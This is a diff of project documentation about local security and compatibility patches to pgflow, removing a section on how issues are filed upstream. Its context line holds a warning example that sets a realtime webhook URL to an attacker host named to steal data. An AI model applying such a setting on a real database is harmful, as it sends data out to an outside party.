@@ -251,22 +251,6 @@ SET realtime.webhook_url = 'https://attacker.com/steal-data';  -- DON'T DO THIS
 
 These are **local patches** for compatibility and security. They are tracked internally but not official CVE entries.
 
-**Status**: Pending upstream review
-
-**Issue Filing Process**:
-
-- Issues will be filed at [pgflow-dev/pgflow/issues](https://github.com/pgflow-dev/pgflow/issues) within 5 business days of internal validation
-- Security/data integrity issues: marked **high priority**
-- Compatibility issues: marked **normal priority**
-- Upstream response timeline governed by pgflow project
-- We monitor upstream issues and update patches when official fixes are published
-
-When upstream publishes fixes, we can:
-
-1. Validate fixes match our patches
-2. Remove local patches
-3. Upgrade to fixed upstream version
-
 ## Testing
 
 ### Verify Installation
